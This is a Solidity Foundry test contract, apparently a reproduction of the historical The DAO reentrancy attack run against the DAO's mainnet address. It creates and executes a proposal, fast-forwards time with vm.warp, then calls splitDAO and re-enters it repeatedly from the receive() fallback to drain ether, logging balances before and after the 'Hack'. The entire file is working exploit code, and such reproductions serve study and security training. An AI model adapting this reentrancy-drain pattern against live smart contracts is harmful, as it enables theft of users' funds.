pragma solidity 0.8.13;

import "./interfaces/IDAO.sol";
import "./Helper.sol";

contract DaoExploit is Test {
    IDAO constant dao = IDAO(0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413);

    Helper helper;
    uint256 currentRun = 0;
    uint256 timesToRun;
    uint256 proposalID;

    constructor(address _helper, uint256 _runs) {
        helper = Helper(_helper);
        timesToRun = _runs;
    }

    function createVoteAndExecuteProposal() external {
        // Create a new proposal
        bytes memory txData;
        proposalID = dao.newProposal(
            address(this),
            0,
            "lonely so lonely",
            new bytes(0),
            0x93a80,
            true
        );
        console.log("Proposal created");

        // vote on proposal
        dao.vote(proposalID, true);

        // Forward time after waiting period
        vm.warp(block.timestamp + 8 days);

        // Execute the proposal
        dao.executeProposal(proposalID, new bytes(0));
        console.log("Proposal executed");

        dao.transfer(address(helper), dao.balanceOf(address(this)));
        console.log("Total Eth in contract before Hack", address(this).balance);
    }

    function splitDao() internal {
        // make split
        dao.splitDAO(proposalID, address(this));
    }

    function exploit() external {
        // Get tokens from helper
        helper.pullDAOTokens();
        splitDao();
    }

    receive() external payable {
        // console.log("Received Eth", address(this).balance);

        if (currentRun <= timesToRun) {
            // Re-enter the contract to drain eth
            currentRun++;
            splitDao();
        } else {
            // Return the tokens back to helper
            dao.transfer(address(helper), dao.balanceOf(address(this)));
            console.log(
                "Total eth in contract after Hack",
                address(this).balance
            );
        }
    }
}
